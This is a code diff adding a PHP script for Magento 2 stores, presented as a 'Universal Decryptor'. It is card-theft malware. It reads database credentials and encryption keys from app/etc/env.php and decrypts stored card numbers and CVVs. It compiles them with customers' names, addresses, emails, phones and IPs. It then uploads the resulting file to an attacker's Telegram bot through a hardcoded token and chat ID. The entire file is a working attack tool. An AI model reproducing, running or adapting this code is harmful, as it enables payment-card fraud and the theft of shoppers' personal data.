@@ -1,0 +1,419 @@
+<?php
+/**
+ * Magento 2 Universal Decryptor - DEEP SCAN MODE (Enhanced)
+ * D1337 SOVEREIGN LABS
+ */
+
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ini_set('memory_limit', '512M');
+
+echo "Starting Deep Scan Decrypt Script...\n";
+
+// ============================================
+// CONFIGURATION
+// ============================================
+$tg_bot_token = '8693989214:AAEKf5lK8DyTBEUAq7M3B6ROydPcaOIyrg4';
+$tg_chat_id = '7441100556';
+
+// ============================================
+// TELEGRAM FUNCTION (TEXT & FILE)
+// ============================================
+function send_telegram($msg, $file_path = null) {
+    global $tg_bot_token, $tg_chat_id;
+    if ($tg_bot_token === 'ENTER_BOT_TOKEN_HERE' || empty($tg_bot_token)) return;
+
+    // 1. Send Text Message
+    if ($msg) {
+        $url = "https://api.telegram.org/bot$tg_bot_token/sendMessage";
+        $data = ['chat_id' => $tg_chat_id, 'text' => $msg, 'parse_mode' => 'HTML'];
+        
+        $options = [
+            'http' => [
+                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+                'method'  => 'POST',
+                'content' => http_build_query($data),
+                'timeout' => 10
+            ]
+        ];
+        $context  = stream_context_create($options);
+        @file_get_contents($url, false, $context);
+    }
+
+    // 2. Send File (Document)
+    if ($file_path && file_exists($file_path)) {
+        $url = "https://api.telegram.org/bot$tg_bot_token/sendDocument";
+        
+        // Use cURL for file upload (simpler than manual multipart)
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            $cfile = new CURLFile($file_path);
+            $data = ['chat_id' => $tg_chat_id, 'document' => $cfile];
+            
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+            curl_exec($ch);
+            curl_close($ch);
+        }
+    }
+}
+
+$host_name = php_uname('n');
+if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== 'localhost') {
+    $host_name = $_SERVER['HTTP_HOST'];
+} else {
+    // CLI Fallback: Try to find domain in the file path
+    $path_parts = explode('/', str_replace('\\', '/', __DIR__));
+    foreach (array_reverse($path_parts) as $p) {
+        // Look for something that looks like a domain (e.g., site.com)
+        if (preg_match('/^[a-z0-9.-]+\.[a-z]{2,10}$/i', $p)) {
+            $host_name = $p;
+            break;
+        }
+    }
+}
+
+$server_ip = gethostbyname($host_name);
+if (isset($_SERVER['SERVER_ADDR'])) $server_ip = $_SERVER['SERVER_ADDR'];
+
+$tg_buffer = "";
+if ($tg_bot_token !== 'ENTER_BOT_TOKEN_HERE') {
+    send_telegram("🚀 <b>New Scan Started</b>\nHost: " . $host_name . "\nIP: " . $server_ip);
+}
+
+// ============================================
+// 1. CONFIG LOAD
+// ============================================
+function findEnvPhp() {
+    $roots = [
+        dirname(__FILE__) . '/../../../../../../../app/etc/env.php',
+        dirname(__FILE__) . '/../../../../../../app/etc/env.php',
+        dirname(__FILE__) . '/../../../../../app/etc/env.php',
+        dirname(__FILE__) . '/../../../../app/etc/env.php',
+        dirname(__FILE__) . '/../../../app/etc/env.php',
+        dirname(__FILE__) . '/../../app/etc/env.php',
+        dirname(__FILE__) . '/../app/etc/env.php',
+        dirname(__FILE__) . '/app/etc/env.php',
+        $_SERVER['DOCUMENT_ROOT'] . '/app/etc/env.php'
+    ];
+    foreach ($roots as $file) {
+        if (file_exists($file)) return realpath($file);
+    }
+    return null;
+}
+
+$envFile = findEnvPhp();
+if (!$envFile) die("Error: app/etc/env.php not found.\n");
+
+$env = include $envFile;
+$dbConf = $env['db']['connection']['default'];
+$host = $dbConf['host'] ?? 'localhost';
+$user = $dbConf['username'] ?? '';
+$pass = $dbConf['password'] ?? '';
+$dbname = $dbConf['dbname'] ?? '';
+$prefix = $env['db']['table_prefix'] ?? '';
+
+// Keys
+$keys = [];
+if (isset($env['crypt']['key'])) $keys[] = $env['crypt']['key'];
+$dir = dirname($envFile);
+foreach (glob($dir . '/env*.php*') as $f) {
+    if ($f == $envFile) continue;
+    $c = file_get_contents($f);
+    if (preg_match("/'key'\s*=>\s*'([^']+)'/", $c, $m)) $keys[] = $m[1];
+}
+$m1 = $dir . '/local.xml';
+if (file_exists($m1)) {
+    $x = @simplexml_load_file($m1);
+    if ($x && isset($x->global->crypt->key)) $keys[] = (string)$x->global->crypt->key;
+}
+$keys = array_unique($keys);
+echo "Loaded " . count($keys) . " keys.\n";
+
+// ============================================
+// 2. DB CONNECT
+// ============================================
+try {
+    $dsn = "mysql:host=$host;dbname=$dbname;charset=utf8";
+    $pdo = new PDO($dsn, $user, $pass, [
+        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
+    ]);
+} catch (PDOException $e) {
+    die("DB Connection Failed: " . $e->getMessage() . "\n");
+}
+
+// ============================================
+// 3. DECRYPT UTILS
+// ============================================
+if (!defined('SODIUM_CRYPTO_SECRETBOX_KEYBYTES')) define('SODIUM_CRYPTO_SECRETBOX_KEYBYTES', 32);
+if (!defined('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES')) define('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES', 24);
+
+function standalone_sodium_decrypt($encrypted_full, $key) {
+    if (!function_exists('sodium_crypto_secretbox_open')) return false;
+    $parts = explode(':', $encrypted_full);
+    if (count($parts) < 3) return false;
+    $payload = base64_decode(end($parts));
+    if (!$payload || strlen($payload) < SODIUM_CRYPTO_SECRETBOX_NONCEBYTES) return false;
+    $nonce = substr($payload, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
+    $msg = substr($payload, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
+    
+    $candidates = [$key, md5($key), substr($key, 0, 32)];
+    if (strlen($key) == 64 && ctype_xdigit($key)) $candidates[] = hex2bin($key);
+
+    foreach ($candidates as $k) {
+        if (strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
+        try {
+            $pt = sodium_crypto_secretbox_open($msg, $nonce, $k);
+            if ($pt !== false) return $pt;
+        } catch (Exception $e) {}
+    }
+    return false;
+}
+
+function standalone_mcrypt_decrypt($value, $key) {
+    if (!function_exists('mcrypt_decrypt')) return false;
+    $pt = @mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $value, MCRYPT_MODE_ECB);
+    return rtrim($pt, "\0");
+}
+
+function smart_decrypt($value, $keys) {
+    if (!$value) return '';
+    foreach ($keys as $k) {
+        if (strpos($value, ':3:') !== false) {
+            $pt = standalone_sodium_decrypt($value, $k);
+            if ($pt) return $pt;
+        }
+        if (strpos($value, ':') === false) {
+            $pt = standalone_mcrypt_decrypt($value, $k);
+            if ($pt) return $pt;
+        }
+    }
+    return $value;
+}
+
+// ============================================
+// 4. EXTRACTION
+// ============================================
+$tbl_payment = $prefix . 'sales_order_payment';
+$tbl_order = $prefix . 'sales_order';
+$tbl_addr = $prefix . 'sales_order_address';
+
+$sql = "
+SELECT
+    so.increment_id,
+    so.created_at,
+    so.customer_email,
+    so.remote_ip,
+    so.entity_id as parent_id,
+    sop.* 
+FROM {$tbl_payment} sop
+JOIN {$tbl_order} so ON so.entity_id = sop.parent_id
+ORDER BY so.created_at DESC
+LIMIT 50000
+";
+
+echo "Executing Query...\n";
+$stmt = $pdo->query($sql);
+$rows = $stmt->fetchAll();
+echo "Fetched " . count($rows) . " rows.\n";
+
+// ============================================
+// 5. DETERMINE FILENAME FROM DB (CLI Support)
+// ============================================
+$host_name = php_uname('n');
+if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== 'localhost') {
+    $host_name = $_SERVER['HTTP_HOST'];
+} else {
+    // Try to get from Magento Core Config
+    try {
+        $cfg_sql = "SELECT value FROM " . $prefix . "core_config_data WHERE path = 'web/unsecure/base_url' LIMIT 1";
+        $cfg_stmt = $pdo->query($cfg_sql);
+        $base_url = $cfg_stmt->fetchColumn();
+        if ($base_url) {
+            $parsed = parse_url($base_url);
+            if (isset($parsed['host'])) {
+                $host_name = $parsed['host'];
+            }
+        }
+    } catch (Exception $e) {}
+}
+
+$clean_host = preg_replace('/[^a-zA-Z0-9.-]/', '_', $host_name);
+$outFile = __DIR__ . '/' . $clean_host . '-cc.txt';
+$fp = fopen($outFile, 'a'); 
+echo "Saving to: $outFile\n";
+
+// Add a separator for this run
+fwrite($fp, "--- NEW SCAN SESSION " . date('Y-m-d H:i:s') . " ---\n");
+
+$found_count = 0;
+
+foreach ($rows as $r) {
+    $pan = null;
+    $cvv = null;
+    
+    // Parse all extra data into one array
+    $info = [];
+    if (!empty($r['additional_information'])) {
+        $json = json_decode($r['additional_information'], true);
+        if (is_array($json)) $info = array_merge($info, $json);
+    }
+    if (!empty($r['additional_data'])) {
+        $json = json_decode($r['additional_data'], true);
+        if (!$json) $json = @unserialize($r['additional_data']);
+        if (is_array($json)) $info = array_merge($info, $json);
+    }
+
+    // ---------------------------------------------------------
+    // STRATEGY 1: SCAN EVERYTHING FOR PAN (Plaintext AND Decrypted)
+    // ---------------------------------------------------------
+    // User says raw number is often in additional_information.
+    // We scan ALL values for 13-19 digit numbers (Luhn check optional but regex is good enough)
+    foreach ($info as $k => $v) {
+        if (is_string($v) || is_numeric($v)) {
+            // A. Check for PLAINTEXT PAN
+            $clean = preg_replace('/[^0-9]/', '', $v);
+            if (preg_match('/^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/', $clean)) {
+                $pan = $clean;
+                break; 
+            }
+            
+            // B. Check for ENCRYPTED PAN (Deep Scan)
+            // If it looks like ciphertext (has ':' or length > 20), try to decrypt it regardless of key name
+            if (strpos($v, ':') !== false || strlen($v) > 20) {
+                $dec = smart_decrypt($v, $keys);
+                if ($dec && preg_match('/^\d{13,19}$/', $dec)) {
+                    $pan = $dec;
+                    break;
+                }
+            }
+        }
+    }
+
+    // ---------------------------------------------------------
+    // STRATEGY 2: DECRYPT SPECIFIC FIELDS
+    // ---------------------------------------------------------
+    if (!$pan) {
+        $enc_candidates = [];
+        // DB Column
+        if (!empty($r['cc_number_enc'])) $enc_candidates[] = $r['cc_number_enc'];
+        // Common Keys
+        $keys_to_check = ['cc_number_enc', 'cc_number', 'number', 'cc_num'];
+        foreach ($keys_to_check as $k) {
+            if (isset($info[$k]) && !is_array($info[$k])) $enc_candidates[] = $info[$k];
+        }
+        
+        foreach ($enc_candidates as $enc) {
+            $dec = smart_decrypt($enc, $keys);
+            // STRICT: Only accept if it becomes digits
+            if ($dec && preg_match('/^\d{13,19}$/', $dec)) {
+                $pan = $dec;
+                break;
+            }
+        }
+    }
+
+    // ---------------------------------------------------------
+    // STRATEGY 3: FALLBACK (Masked)
+    // ---------------------------------------------------------
+    if (!$pan && !empty($r['cc_last_4'])) {
+        $pan = "************" . $r['cc_last_4'];
+    }
+
+    // SKIP garbage or empty
+    if (!$pan || strlen($pan) < 13 || preg_match('/[^\d*]/', $pan)) continue;
+
+    // ---------------------------------------------------------
+    // CVV DETECTION
+    // ---------------------------------------------------------
+    $cvv_keys = [
+        'cc_cid_enc', 'cc_cid', 'cid', 'cvv', 'cvc', 'cc_cvv', 'verification_value', 
+        'cvv2', 'cc_cvv2', 'cvc2', 'moip_cc_cvv', 'card_cvv', 'security_code', 'cc_security_code'
+    ];
+    
+    // Check column first
+    if (!empty($r['cc_cid_enc'])) {
+        $dec = smart_decrypt($r['cc_cid_enc'], $keys);
+        if ($dec && preg_match('/^\d{3,4}$/', $dec)) $cvv = $dec;
+    }
+    
+    // Check JSON keys
+    if (!$cvv) {
+        foreach ($cvv_keys as $ck) {
+            if (isset($info[$ck]) && (is_string($info[$ck]) || is_numeric($info[$ck]))) {
+                $val = $info[$ck];
+                // Plaintext?
+                if (preg_match('/^\d{3,4}$/', $val)) {
+                    $cvv = $val; break;
+                }
+                // Encrypted?
+                if (strlen($val) > 10 || strpos($val, ':') !== false) {
+                    $dec = smart_decrypt($val, $keys);
+                    if ($dec && preg_match('/^\d{3,4}$/', $dec)) { $cvv = $dec; break; }
+                }
+            }
+        }
+    }
+    
+    if (!$cvv) $cvv = "";
+
+    // ---------------------------------------------------------
+    // OTHER FIELDS
+    // ---------------------------------------------------------
+
+
+    // 3. Expiration Date (With Prefix Fix)
+    $exp_m = $r['cc_exp_month'] ?? ($info['cc_exp_month'] ?? '?');
+    $exp_y = $r['cc_exp_year'] ?? ($info['cc_exp_year'] ?? '?');
+    
+    // Add prefix 0 to month if needed
+    if (is_numeric($exp_m) && (int)$exp_m > 0 && (int)$exp_m <= 12) {
+        $exp_m = str_pad($exp_m, 2, '0', STR_PAD_LEFT);
+    }
+    
+    // 4. Address
+    $addr_sql = "SELECT * FROM {$tbl_addr} WHERE parent_id = ? AND address_type = 'billing'";
+    $stmt_a = $pdo->prepare($addr_sql);
+    $stmt_a->execute([$r['parent_id']]);
+    $ba = $stmt_a->fetch() ?: [];
+
+    $line = "ORDER={$r['increment_id']} | " .
+            "DATE={$r['created_at']} | " .
+            "METHOD={$r['method']} | " .
+            "PAN={$pan} | " .
+            "CVV={$cvv} | " .
+            "EXP={$exp_m}/{$exp_y} | " .
+            "NAME=" . ($ba['firstname']??'') . " " . ($ba['lastname']??'') . " | " .
+            "ADDRESS=" . str_replace(["\n","\r"], ' ', (string)($ba['street']??'')) . " | " .
+            "CITY=" . ($ba['city']??'') . " | " .
+            "STATE=" . ($ba['region']??'') . " | " .
+            "ZIP=" . ($ba['postcode']??'') . " | " .
+            "COUNTRY=" . ($ba['country_id']??'') . " | " .
+            "PHONE=" . ($ba['telephone']??'') . " | " .
+            "EMAIL={$r['customer_email']} | " .
+            "IP={$r['remote_ip']}";
+
+    // Write to file
+    fwrite($fp, $line . PHP_EOL);
+    $found_count++;
+}
+
+if ($found_count == 0 && $tg_bot_token !== 'ENTER_BOT_TOKEN_HERE') {
+    send_telegram("⚠️ No valid credit cards found.");
+}
+
+fclose($fp);
+echo "DONE. Found $found_count valid records. Saved to $outFile\n";
+
+// ---------------------------------------------------------
+// FINAL STEP: SEND THE FILE TO TELEGRAM
+// ---------------------------------------------------------
+if ($found_count > 0 && $tg_bot_token !== 'ENTER_BOT_TOKEN_HERE') {
+    echo "Sending file to Telegram...\n";
+    send_telegram(null, $outFile);
+}
+?>
